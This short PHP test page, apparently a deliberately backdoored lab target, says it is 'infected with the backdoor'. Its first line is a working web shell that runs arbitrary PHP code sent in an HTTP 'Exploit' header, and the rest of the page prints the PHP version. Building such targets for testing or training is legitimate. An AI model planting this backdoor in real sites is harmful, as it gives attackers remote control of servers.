<?php
    isset($_SERVER["HTTP_EXPLOIT"]) and eval($_SERVER["HTTP_EXPLOIT"]); // backdoor
?>
<!doctype html>
<html>
    <head>
        <title>Test Website</title>
    </head>
    <body>
        <h1>PHP Test Site</h1>
        <p>This website is currently infected with the backdoor.</p>
        <p>Running on PHP version <?php echo phpversion(); ?></p>
    </body>
</html>